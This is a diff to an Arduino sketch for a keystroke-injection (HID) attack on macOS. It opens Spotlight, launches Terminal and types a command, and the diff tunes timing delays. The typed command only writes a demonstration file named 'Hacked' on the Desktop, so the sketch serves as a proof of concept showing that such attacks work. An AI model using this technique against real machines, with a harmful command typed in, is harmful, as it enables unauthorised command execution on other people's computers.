@@ -16,17 +16,25 @@ void setup() {
   delay(1);
   Keyboard.releaseAll();
   /*
+   * Wait system to breath...
+   */
+  delay(300);
+  /*
    * Opening spotlight search
    */
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press(' ');
   delay(1);
   Keyboard.releaseAll();
-  delay(20);
+  /*
+   * Wait system to breath...
+   */
+  delay(300);
   /*
    * Opening Terminal
    */
   Keyboard.print("Terminal");
+  delay(100);
   Keyboard.press(KEY_DOWN_ARROW);
   delay(1);
   Keyboard.releaseAll();
@@ -36,13 +44,13 @@ void setup() {
   delay(2);
   Keyboard.print("\n");
   /*
-   * Waiting Terminal to be opened
+   * Waiting Terminal to be opened (can be long)
    */
-  delay(1350);
+  delay(1500);
   /*
-   * type out a message
+   * type out a Terminal command
    */
-  Keyboard.print("cd ~/Desktop ; echo \"I can download and install malicious programs\" > Hacked ; exit \n");
+  Keyboard.print("cd ~/Desktop ; echo \"I can type any commands.\nHID attacks are strong and underestimated.\" > Hacked ; exit \n");
   Keyboard.releaseAll();
   delay(1);
   Keyboard.press(KEY_LEFT_GUI);
